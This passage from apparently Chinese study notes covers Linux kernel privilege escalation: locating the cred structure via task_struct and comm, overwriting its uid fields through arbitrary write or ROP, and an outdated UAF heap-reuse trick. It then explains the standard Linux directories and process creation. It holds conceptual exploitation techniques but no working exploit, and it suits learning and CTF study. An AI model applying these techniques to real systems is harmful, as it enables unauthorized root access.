延迟释放的。</p><blockquote><p>usage字段是cred结构体中的一个计数器，用于记录对该cred结构体的引用数。每当有一个进程引用该cred结构体时，usage计数就会增加；当引用结束时，计数就会减少。这个计数机制被用于管理cred结构体的生命周期和内存释放。</p><p>具体来说，usage的作用有以下几个方面：</p><ol><li>引用计数：usage字段用于跟踪cred结构体的引用次数。通过增加和减少usage计数，内核可以确定何时可以安全地释放cred结构体的内存。</li><li>延迟释放：cred结构体的释放是通过RCU（Read-Copy-Update）机制来延迟执行的。当usage计数减少到0时，并不立即释放cred结构体的内存，而是延迟到合适的时机，以确保没有正在使用该cred结构体的代码存在。</li><li>进程共享：由于cred结构体可以被多个进程引用，通过共享同一个cred结构体，可以节省内存和提高性能。usage计数的增加和减少反映了cred结构体的引用情况，确保在没有进程引用时才释放相关的资源。</li></ol><p>在定位cred结构体的过程中，通过检查usage字段可以了解当前有多少进程正在引用该cred结构体。如果发现usage为0，表示当前没有进程引用该cred结构体，可能可以安全地释放它。但需要注意的是，由于RCU的延迟释放机制，即使usage为0，cred结构体的内存也可能不会立即释放，而是会在合适的时机进行释放。</p></blockquote><h5 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h5><h6 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h6><p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li><li>获取 <code>cred</code> 具体的地址</li></ol><h6 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h6><p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p><blockquote><p>在Linux系统中，prctl（Process Control）是一个系统调用，用于控制和修改进程的各种属性和行为。通过prctl系统调用，可以对进程进行各种操作，如设置进程的名称、获取和修改进程的资源限制、修改进程的信号处理方式等。</p><p>具体来说，prctl系统调用的功能包括但不限于以下几个方面：</p><ol><li>进程名称（comm）的设置：可以使用prctl系统调用来设置进程的名称。进程名称是在进程表中标识进程的一个字符串。通过设置特殊的进程名称，可以在定位和识别进程时提供更多的信息。</li><li>进程资源限制的获取和修改：可以使用prctl系统调用来获取和修改进程的资源限制，如CPU时间限制、内存限制、文件描述符限制等。这可以帮助控制进程的资源使用情况，以及保护系统免受恶意进程的影响。</li><li>进程信号处理方式的修改：可以使用prctl系统调用来修改进程接收和处理信号的方式。可以设置进程忽略某些信号、捕获和处理某些信号，或者恢复默认的信号处理方式。</li><li>进程状态的获取和修改：可以使用prctl系统调用来获取和修改进程的状态信息，如进程的运行状态、终止状态等。这可以用于监控和管理进程的状态。</li><li>其他进程控制操作：prctl系统调用还提供其他一些进程控制操作，如设置线程名字、获取和修改进程的调度策略和优先级、获取和修改进程的安全上下文等。</li></ol><p>通过使用prctl系统调用，可以对进程进行灵活的控制和管理，以满足特定的需求和场景。在定位进程时，可以使用prctl设置进程的名称（comm）为特殊的字符串，以便更方便地进行搜索和识别。</p></blockquote><h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>在这种方法下，我们可以直接将 cred 中的 uid-fsgid 都修改为 0。当然修改的方式有很多种，比如说</p><ul><li>在我们具有任意地址读写后，可以直接修改 cred。</li><li>在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</li></ul><h3 id="间接定位-1"><a href="#间接定位-1" class="headerlink" title="间接定位"></a>间接定位</h3><p>虽然我们确实想要修改 cred 的内容，但是不一定非得知道 cred 的具体位置，我们只需要能够修改 cred 即可。</p><h4 id="（已过时）UAF-使用同样堆块"><a href="#（已过时）UAF-使用同样堆块" class="headerlink" title="（已过时）UAF 使用同样堆块"></a>（已过时）UAF 使用同样堆块</h4><p>如果我们在进程初始化时能控制 cred 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的。这里给出一个典型的例子</p><ol><li>申请一块与 cred 结构体大小一样的堆块</li><li>释放该堆块</li><li>fork 出新进程，恰好使用刚刚释放的堆块</li><li>此时，修改 cred 结构体特定内存，从而提权</li></ol><p>但是<strong>此种方法在较新版本内核中已不再可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内核的文件系统"><a href="#内核的文件系统" class="headerlink" title="内核的文件系统"></a>内核的文件系统</h1><h2 id="dev文件"><a href="#dev文件" class="headerlink" title="dev文件"></a>dev文件</h2><p>在Linux系统中，<code>/dev</code>目录是一个特殊的目录，用于表示<strong>设备文件</strong>。设备文件是用于<strong>与系统中的硬件设备或其他特殊设备进行交互的接口</strong>。<code>/dev</code>目录中的文件对应着系统中的各种设备，包括磁盘驱动器、串口、打印机等。</p><p>下面是一些常见的<code>/dev</code>目录中的设备文件及其含义：</p><ol><li><code>/dev/null</code>：一个特殊的设备文件，用于丢弃所有写入它的数据。读取它将立即返回文件结束。</li><li><code>/dev/zero</code>：一个特殊的设备文件，用于提供无限的零字节数据。读取它将返回连续的零字节。</li><li><code>/dev/random</code>和<code>/dev/urandom</code>：这些设备文件用于<strong>生成随机数</strong>据。<code>/dev/random</code>提供高质量的随机数据，但当熵池耗尽时会阻塞读取操作。<code>/dev/urandom</code>则不会阻塞，但在熵池耗尽时可能提供较低质量的随机数据。</li><li><code>/dev/tty</code>：<strong>代表当前终端设备的设备文件</strong>。它通常用于与终端进行交互，例如读取键盘输入或向终端输出数据。</li><li><code>/dev/sda</code>、<code>/dev/sdb</code>等：这些设备文件表示系统中的物理磁盘驱动器。每个磁盘驱动器都被分配一个相应的设备文件，用于进行磁盘操作，如读取和写入数据。</li><li><code>/dev/input/eventX</code>：这些设备文件表示输入设备，如键盘、鼠标和触摸屏。每个输入设备都被分配一个对应的设备文件，用于读取设备的输入事件。</li><li><code>/dev/videoX</code>：这些设备文件代表视频设备，如摄像头。每个视频设备都被分配一个对应的设备文件，用于捕获视频数据。</li></ol><h2 id="bin文件"><a href="#bin文件" class="headerlink" title="bin文件"></a>bin文件</h2><p>在计算机领域中，”bin”一词通常是指二进制文件（Binary file）。二进制文件是一种以二进制形式存储的文件，其中包含计算机可执行代码或非文本数据。</p><p>二进制文件与文本文件不同，它们不是使用可读的字符编码（如ASCII或UTF-8）表示的文本数据，而是以机器可执行的二进制形式存储的数据。二进制文件可以包含编译后的程序代码、可执行文件、库文件、图像、音频、视频等各种非文本数据。</p><p>二进制文件通常由编译器、链接器或其他工具生成，用于在计算机上执行特定的操作。例如，可执行文件（executable file）是一种特殊的二进制文件，包含了计算机可直接执行的指令和数据，用于运行程序。库文件（library file）是包含可重用代码和函数的二进制文件，用于在程序开发中进行链接和共享。</p><p>二进制文件的内容对于人类来说通常是不可读的，因为它们不是使用文本编码表示的。要查看二进制文件的内容，通常需要使用特定的工具或程序进行解析和处理。</p><p>总结起来，”bin”文件是指二进制文件，其中包含了以二进制形式存储的计算机可执行代码或非文本数据。它们在计算机系统中起着重要的作用，用于存储和执行各种类型的程序和数据。</p><h2 id="etc文件"><a href="#etc文件" class="headerlink" title="etc文件"></a>etc文件</h2><p>在类Unix操作系统中，<code>/etc</code>目录是一个非常重要的目录，它用于存放系统的配置文件。这个目录包含了系统大部分的配置文件和子目录。我们可以将其视为系统的“设置中心”。下面是一些<code>/etc</code>目录下常见的文件和子目录的中文详解：</p><ol><li>**<code>/etc/passwd</code>**：这是一个用户账户信息文件，记录了系统上每个用户的基本信息，例如用户ID、组ID、家目录、登录shell等。虽然这个文件包含密码信息的位置，但现代系统中密码通常是加密后存储在<code>/etc/shadow</code>中。</li><li>**<code>/etc/shadow</code>**：存储加密后的用户密码以及与密码相关的管理信息，如密码更改日期、过期时间等。出于安全考虑，这个文件的读权限非常严格，通常只有超级用户（root）可以访问。</li><li>**<code>/etc/group</code>**：类似于<code>/etc/passwd</code>，但这个文件记录的是组的信息，包括组名、组密码（很少使用）、组ID以及属于该组的用户列表。</li><li>**<code>/etc/fstab</code>**：文件系统表，这个文件包含了系统启动时需要挂载的分区和存储设备的信息，包括设备名、挂载点、文件系统类型、挂载选项等。</li><li>**<code>/etc/hosts</code>**：这是一个本地DNS解析文件，用于将主机名映射到IP地址。在进行DNS查询之前，系统会首先检查这个文件。</li><li>**<code>/etc/resolv.conf</code>**：DNS客户端的配置文件，指定了系统解析域名时应该查询的DNS服务器的IP地址。</li><li>**<code>/etc/sysctl.conf</code>**：用于配置内核参数的文件。系统管理员可以通过编辑这个文件来调整和优化系统的运行参数。</li><li>**<code>/etc/crontab</code>**：系统定时任务配置文件，允许系统管理员安排在特定时间自动执行的任务。</li><li>**<code>/etc/services</code>**：这个文件列出了网络服务和对应的端口号，例如HTTP通常对应端口80。这有助于软件和服务找到它们应该使用的标准端口。</li><li>**<code>/etc/network/interfaces</code>**（在一些系统中）：网络接口配置文件，用于设置网络接口的IP地址、子网掩码、网关等网络参数。</li></ol><p>这只是<code>/etc</code>目录下一小部分文件和目录的简介。<code>/etc</code>目录下的文件和子目录数量众多，且随着不同的发行版和系统配置的不同而有所变化。管理员和高级用户通常需要根据具体需求编辑这些文件来配置系统。</p><h2 id="home文件"><a href="#home文件" class="headerlink" title="home文件"></a>home文件</h2><p>在类Unix操作系统中，<code>/home</code>目录扮演着非常重要的角色，它是用户的个人目录的默认存放位置。每个在系统上有账户的普通用户都会在<code>/home</code>目录下拥有一个与其用户名同名的目录，用来存储个人文件、配置文件、用户级的程序设置等。以下是对<code>/home</code>目录的详细解释：</p><h3 id="home目录的作用"><a href="#home目录的作用" class="headerlink" title="/home目录的作用"></a><code>/home</code>目录的作用</h3><ul><li><strong>用户数据存储</strong>：用户可以在自己的<code>/home</code>子目录中存储个人文件、文档、图片、音乐等数据。</li><li><strong>用户配置文件</strong>：很多程序会在用户的<code>/home</code>子目录中创建隐藏文件或目录（文件或目录名以<code>.</code>开头）来存储程序的用户级配置。例如，浏览器可能会在用户的<code>/home</code>子目录下创建一个隐藏的配置目录来存储书签和历史记录。</li><li><strong>用户级软件安装</strong>：用户可以在自己的<code>/home</code>目录下安装软件或脚本，这些软件或脚本只对当前用户有效，不影响系统中的其他用户。</li></ul><h3 id="home目录的特点"><a href="#home目录的特点" class="headerlink" title="/home目录的特点"></a><code>/home</code>目录的特点</h3><ul><li><strong>隔离性</strong>：每个用户的<code>/home</code>子目录是独立的，这意味着一个用户默认情况下无法访问另一个用户的<code>/home</code>子目录。这提供了一定程度的数据隔离和隐私保护。</li><li><strong>备份与迁移</strong>：由于用户的个人数据和配置都存储在<code>/home</code>目录下，这使得备份和迁移用户数据变得相对简单。系统管理员可以通过备份整个<code>/home</code>目录来备份所有用户的个人数据。</li><li><strong>灵活性</strong>：如果系统需要重新安装或升级，通常不需要对<code>/home</code>目录进行更改，这意味着用户的个人设置和数据可以在系统升级或重装后保持不变。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>存储空间管理</strong>：在有限的磁盘空间情况下，<code>/home</code>目录可能会成为存储空间不足的瓶颈。因此，管理好<code>/home</code>目录下的存储空间使用情况是很重要的。</li><li><strong>安全性</strong>：虽然<code>/home</code>目录提供了用户数据的隔离，但是如果系统的安全设置不当，恶意用户或程序仍然有可能访问或修改其他用户的数据。因此，保持系统的安全更新和合理配置权限是非常重要的。</li></ul><p>总的来说，<code>/home</code>目录是类Unix操作系统中非常关键的一个组成部分，它为用户提供了一个存储个人数据和配置的空间，同时也带来了一系列的管理和安全上的考虑。</p><h2 id="lib文件"><a href="#lib文件" class="headerlink" title="lib文件"></a>lib文件</h2><p>在类Unix操作系统中，<code>/lib</code>目录是一个关键的系统目录，用于存放操作系统运行所需的基本共享库文件和内核模块。这些库文件对于系统的正常运行至关重要，因为它们提供了许多基本的功能，供不同的程序和服务调用。以下是对<code>/lib</code>目录的详细解释：</p><h3 id="lib目录的作用"><a href="#lib目录的作用" class="headerlink" title="/lib目录的作用"></a><code>/lib</code>目录的作用</h3><ul><li><strong>共享库</strong>：<code>/lib</code>目录包含了系统最基本的共享库文件，这些文件类似于Windows操作系统中的DLL文件。它们提供了许多常用的功能，如文件操作、数学计算、字符串处理等，可以被系统中的多个程序共同使用。</li><li><strong>内核模块</strong>：<code>/lib</code>目录还存放了内核模块（在<code>/lib/modules</code>目录下），这些模块可以在系统运行时动态加载或卸载，用于支持硬件设备、文件系统类型等。</li></ul><h3 id="lib目录的特点"><a href="#lib目录的特点" class="headerlink" title="/lib目录的特点"></a><code>/lib</code>目录的特点</h3><ul><li><strong>核心依赖</strong>：<code>/lib</code>目录中的文件是系统启动和运行的核心依赖。例如，即使是最基本的命令行工具，如<code>ls</code>或<code>bash</code>，也需要调用<code>/lib</code>目录中的库文件来执行。</li><li><strong>动态链接</strong>：存放在<code>/lib</code>目录中的共享库文件通常是动态链接的，意味着程序在运行时才会加载这些库文件。这种方式可以减少程序的磁盘和内存占用，因为多个程序可以共享同一份库文件，而不是每个程序都包含自己的库副本。</li></ul><h3 id="lib目录下的重要子目录"><a href="#lib目录下的重要子目录" class="headerlink" title="/lib目录下的重要子目录"></a><code>/lib</code>目录下的重要子目录</h3><ul><li>**<code>/lib32</code>和<code>/lib64</code>**：在64位系统中，<code>/lib</code>目录可能会包含<code>/lib32</code>和<code>/lib64</code>子目录，分别用于存放32位和64位的库文件。这样做是为了保持对32位应用程序的兼容性。</li><li>**<code>/lib/modules</code>**：存放内核模块的目录，这些模块可以根据需要动态加载到内核中。</li></ul><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>系统稳定性</strong>：由于<code>/lib</code>目录包含了系统的核心库文件，任何对这些文件的不当修改都可能导致系统不稳定或无法启动。</li><li><strong>安全性</strong>：库文件是攻击者常见的攻击目标之一，因为它们通常具有高权限且被广泛使用。因此，保持系统和库文件的更新是非常重要的。</li></ul><p>总的来说，<code>/lib</code>目录是类Unix操作系统中非常关键的一个组成部分，它为系统提供了核心的共享库和内核模块，使得系统能够高效地运行各种程序和服务。</p><h2 id="proc文件"><a href="#proc文件" class="headerlink" title="proc文件"></a>proc文件</h2><p>在类Unix操作系统中，<code>/proc</code>目录是一个特殊的目录，它并不存储在磁盘上，而是一个虚拟的文件系统，通常被称为proc文件系统。<code>/proc</code>提供了一个窗口，通过它可以查看运行中的内核和进程信息，以及修改某些内核参数。这个目录包含了大量的信息，既包括关于系统硬件的详细信息，也包括关于当前运行的进程的信息。以下是对<code>/proc</code>目录的详细解释：</p><h3 id="proc目录的作用"><a href="#proc目录的作用" class="headerlink" title="/proc目录的作用"></a><code>/proc</code>目录的作用</h3><ul><li><strong>内核参数访问</strong>：<code>/proc</code>目录允许用户和应用程序访问和修改内核参数。例如，<code>/proc/sys</code>目录下的文件可以用来动态调整内核的行为。</li><li><strong>进程信息</strong>：对于系统上的每个进程，<code>/proc</code>都有一个以进程ID命名的子目录，例如<code>/proc/1234</code>。这些目录包含了关于各个进程的详细信息，如内存映射、打开的文件描述符、进程状态等。</li><li><strong>系统信息</strong>：<code>/proc</code>目录提供了关于系统硬件和配置的信息，例如CPU信息（<code>/proc/cpuinfo</code>）、内存信息（<code>/proc/meminfo</code>）、分区表（<code>/proc/partitions</code>）等。</li></ul><h3 id="proc目录的特点"><a href="#proc目录的特点" class="headerlink" title="/proc目录的特点"></a><code>/proc</code>目录的特点</h3><ul><li><strong>虚拟的</strong>：<code>/proc</code>是一个虚拟文件系统，它存在于内存中，不占用磁盘空间。这意味着其中的文件和目录是由内核动态生成的，以提供关于系统状态的实时信息。</li><li><strong>可读写</strong>：虽然大多数<code>/proc</code>下的文件是只读的，但有些文件是可写的，允许通过直接写入这些文件来修改内核参数。</li><li><strong>实时性</strong>：<code>/proc</code>目录下的信息是实时更新的，反映了当前系统的状态。</li></ul><h3 id="proc目录下的一些重要文件和目录"><a href="#proc目录下的一些重要文件和目录" class="headerlink" title="/proc目录下的一些重要文件和目录"></a><code>/proc</code>目录下的一些重要文件和目录</h3><ul><li><strong><code>/proc/cpuinfo</code><strong>：显示</strong>CPU的信息</strong>，如型号、核心数、速度等。</li><li><strong><code>/proc/meminfo</code><strong>：显示</strong>内存的详细使用信息</strong>，包括总内存、可用内存、缓存等。</li><li><strong><code>/proc/partitions</code><strong>：显示系统中</strong>所有分区</strong>的列表。</li><li><strong><code>/proc/sys</code><strong>：包含可以</strong>动态调整的内核参数</strong>。通过修改这里的文件，可以改变系统的行为。</li><li><strong><code>/proc/[pid]</code><strong>：每个正在运行的进程都有一个对应的目录，目录名为进程的PID。这些目录</strong>包含了关于进程的详细信息</strong>。</li></ul><h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>安全性</strong>：由于<code>/proc</code>目录提供了大量的系统信息和部分内核参数修改能力，恶意程序可能会尝试读取这些信息或修改参数以提升权限或进行攻击。因此，系统管理员需要留意对<code>/proc</code>目录的访问控制。</li><li><strong>性能影响</strong>：频繁地访问或修改某些<code>/proc</code>文件可能会对系统性能产生影响，特别是在高负载情况下。</li></ul><p>总的来说，<code>/proc</code>目录是一个功能强大的工具，为系统管理员和开发者提供了一种方便的方式来监控和调整系统运行时的行为。</p><h2 id="sbin文件"><a href="#sbin文件" class="headerlink" title="sbin文件"></a>sbin文件</h2><p>在类Unix操作系统中，<code>/sbin</code>目录是一个存放系统管理和维护程序的特殊目录。这个目录包含的程序通常是供系统管理员使用的，而不是普通用户。这些程序包括用于启动、修复、恢复和维护系统的各种工具。与<code>/bin</code>目录下的命令相比，<code>/sbin</code>目录下的命令更多地关注系统级别的操作和维护任务。以下是对<code>/sbin</code>目录的详细解释：</p><h3 id="sbin目录的作用"><a href="#sbin目录的作用" class="headerlink" title="/sbin目录的作用"></a><code>/sbin</code>目录的作用</h3><ul><li><strong>系统启动和恢复</strong>：<code>/sbin</code>目录包含了启动系统所需的重要命令，如<code>init</code>、<code>systemd</code>或<code>upstart</code>。这些是系统初始化和管理服务的核心工具。</li><li><strong>设备管理</strong>：这个目录下的命令包括用于管理硬件设备的程序，比如<code>fdisk</code>、<code>mkfs</code>、<code>fsck</code>等，它们分别用于分区、格式化和检查文件系统。</li><li><strong>网络配置</strong>：<code>/sbin</code>还包含了配置网络的工具，例如<code>ifconfig</code>（尽管在一些现代的Linux发行版中，<code>ifconfig</code>已经被<code>ip</code>命令替代，并且可能位于<code>/bin</code>或<code>/usr/bin</code>目录）。</li><li><strong>系统安全</strong>：包括用于设置和管理系统安全方面的命令，如<code>iptables</code>用于配置防火墙规则。</li></ul><h3 id="sbin目录的特点"><a href="#sbin目录的特点" class="headerlink" title="/sbin目录的特点"></a><code>/sbin</code>目录的特点</h3><ul><li><strong>专业性</strong>：与<code>/bin</code>目录下的命令相比，<code>/sbin</code>目录下的命令更加专业，主要面向系统管理和维护。</li><li><strong>访问限制</strong>：出于安全考虑，这些命令通常只有root用户或具有相应权限的用户才能执行。这是为了防止普通用户执行可能会影响系统稳定性和安全性的操作。</li></ul><h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>谨慎使用</strong>：由于<code>/sbin</code>目录下的命令具有很高的权限和强大的功能，不当的使用可能会导致系统不稳定甚至数据丢失。因此，只有在清楚命令作用的情况下才使用这些命令。</li><li><strong>路径问题</strong>：在一些系统中，特别是在非root用户下，<code>/sbin</code>目录可能不在默认的环境变量<code>PATH</code>中。如果需要执行<code>/sbin</code>目录下的命令，可能需要指定完整的路径或临时修改<code>PATH</code>变量。</li></ul><p>总的来说，<code>/sbin</code>目录是类Unix操作系统中非常重要的一个目录，它包含了许多系统级别的管理和维护工具。了解和合理使用这些工具对于系统管理员来说非常重要。</p><h2 id="sys文件"><a href="#sys文件" class="headerlink" title="sys文件"></a>sys文件</h2><p>在类Unix操作系统中，<code>/sys</code>目录是一个虚拟文件系统，称为sysfs。sysfs提供了一种机制，使得内核空间能够将信息导出到用户空间，从而允许用户空间的程序和用户查询和控制内核中的设备和驱动程序的状态。与<code>/proc</code>文件系统相似，<code>/sys</code>也不占用磁盘空间，它在系统启动时由内核动态生成。以下是对<code>/sys</code>目录的详细解释：</p><h3 id="sys目录的作用"><a href="#sys目录的作用" class="headerlink" title="/sys目录的作用"></a><code>/sys</code>目录的作用</h3><ul><li><strong>设备和驱动程序信息</strong>：<code>/sys</code>提供了一种查看和交互式修改与系统硬件设备相关的信息的方法。每个硬件设备在<code>/sys</code>中都有一个对应的目录，通过这个目录，可以访问设备的属性、状态以及相关的驱动程序信息。</li><li><strong>内核对象（kobjects）表示</strong>：sysfs使用内核对象（kobjects）来表示内核中的各种结构，如设备、驱动程序和内核模块。这为用户提供了一种直观的方式来浏览和修改这些对象的属性。</li><li><strong>系统配置</strong>：除了提供设备信息，<code>/sys</code>还允许某些参数的动态修改，这可以影响系统的运行方式和设备的配置。</li></ul><h3 id="sys目录的特点"><a href="#sys目录的特点" class="headerlink" title="/sys目录的特点"></a><code>/sys</code>目录的特点</h3><ul><li><strong>虚拟的</strong>：与<code>/proc</code>一样，<code>/sys</code>是一个虚拟文件系统，它反映了内核的当前状态，但不占用实际的磁盘空间。</li><li><strong>结构化</strong>：<code>/sys</code>的结构比<code>/proc</code>更加直观和有组织，它按照设备类型和功能进行组织，使得查找特定设备或信息更加容易。</li><li><strong>可读写</strong>：<code>/sys</code>中的许多文件不仅可读，也可写。这允许用户或应用程序通过写入这些文件来改变设备的状态或配置。</li></ul><h3 id="sys目录下的一些重要子目录"><a href="#sys目录下的一些重要子目录" class="headerlink" title="/sys目录下的一些重要子目录"></a><code>/sys</code>目录下的一些重要子目录</h3><ul><li>**<code>/sys/block</code>**：包含系统中所有块设备的信息，如硬盘和光驱。</li><li>**<code>/sys/class</code>**：按设备类型组织的设备信息，如<code>/sys/class/net</code>包含网络接口的信息。</li><li>**<code>/sys/devices</code>**：包含系统中所有设备的层次结构，这是按照物理或逻辑结构组织的。</li><li>**<code>/sys/module</code>**：包含当前加载的内核模块信息。</li></ul><h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>谨慎修改</strong>：虽然<code>/sys</code>提供了修改设备配置和参数的能力，但不恰当的修改可能会导致系统不稳定或硬件设备工作异常。因此，在修改<code>/sys</code>中的文件之前，应确保了解这些修改的含义和后果。</li><li><strong>权限</strong>：修改<code>/sys</code>中的文件通常需要管理员权限，因为这些更改可能会影响系统的整体运行。</li></ul><p>总的来说，<code>/sys</code>目录是Linux内核提供的一种强大的机制，用于展示系统硬件信息和配置，它为用户和程序提供了直接与内核交互的能力。</p><h2 id="tmp文件"><a href="#tmp文件" class="headerlink" title="tmp文件"></a>tmp文件</h2><p>在类Unix操作系统中，<code>/tmp</code>目录是一个用于存放临时文件的特殊目录。这个目录供系统和用户存放在短期内需要的文件，但这些文件随后可能会被删除或丢弃。<code>/tmp</code>目录对所有用户都是可写的，因此它是多用户环境下共享临时数据的一个常用位置。以下是对<code>/tmp</code>目录的详细解释：</p><h3 id="tmp目录的作用"><a href="#tmp目录的作用" class="headerlink" title="/tmp目录的作用"></a><code>/tmp</code>目录的作用</h3><ul><li><strong>临时数据存储</strong>：<code>/tmp</code>提供了一个存储临时数据的地方，这些数据包括但不限于临时文件、处理中的数据文件、缓存文件等。</li><li><strong>程序执行中间产物</strong>：很多程序在执行过程中会产生临时文件，这些文件用于存储中间结果或日志信息，执行完毕后通常会被删除。</li><li><strong>用户和应用程序的临时文件</strong>：除了系统进程外，用户启动的应用程序也可能会在<code>/tmp</code>中创建临时文件，用于各种临时需求。</li></ul><h3 id="tmp目录的特点"><a href="#tmp目录的特点" class="headerlink" title="/tmp目录的特点"></a><code>/tmp</code>目录的特点</h3><ul><li><strong>易失性</strong>：<code>/tmp</code>目录中的数据是易失的，这意味着在系统重启过程中，存储在其中的文件可能会被删除。一些系统在启动时会自动清理<code>/tmp</code>目录，而其他系统可能会运行定期的清理任务。</li><li><strong>安全性</strong>：由于<code>/tmp</code>是对所有用户可写的，因此存在一定的安全风险。恶意用户或程序可能会尝试利用<code>/tmp</code>目录中的文件执行攻击，或通过创建大量文件耗尽系统资源。</li><li><strong>权限管理</strong>：系统通常会对<code>/tmp</code>目录设置特定的权限和粘滞位（sticky bit），以防止用户删除或修改不属于他们的文件。</li></ul><h3 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>定期清理</strong>：由于<code>/tmp</code>用于存放临时文件，建议定期清理以释放磁盘空间，尤其是在磁盘空间较小的系统上。</li><li><strong>安全措施</strong>：在使用<code>/tmp</code>时，应该注意安全性，避免在其中存储敏感信息。同时，开发者在创建临时文件时应使用安全的方法，如使用<code>mktemp</code>命令或相应的库函数来创建唯一的临时文件名，以减少安全风险。</li><li><strong>替代方案</strong>：对于需要长期存储的临时文件，应考虑使用其他目录，如用户的主目录下的临时文件夹，或者系统提供的其他临时存储位置，例如<code>/var/tmp</code>。与<code>/tmp</code>不同，<code>/var/tmp</code>在系统重启后通常不会被清空。</li></ul><p>总的来说，<code>/tmp</code>目录是一个用于存放临时文件的便利位置，但使用时需要注意数据的易失性和安全性问题。合理管理<code>/tmp</code>目录对于维护系统的稳定性和安全性非常重要。</p><h1 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h1><p>一个进程的创建可以发生在以下几种情况下：</p><ol><li>系统启动： 当计算机系统启动时，会自动创建一个或多个进程作为系统的初始进程。这些初始进程通常是操作系统内核的一部分，负责初始化系统资源、加载驱动程序和启动其他进程。</li><li>程序执行： 当执行一个可执行程序时，操作系统会创建一个新的进程来运行该程序。这个新创建的进程称为子进程，而执行程序的进程称为父进程。子进程是父进程的副本，它会继承父进程的代码、数据和资源，并开始执行程序的指令。</li><li>调用fork()函数： 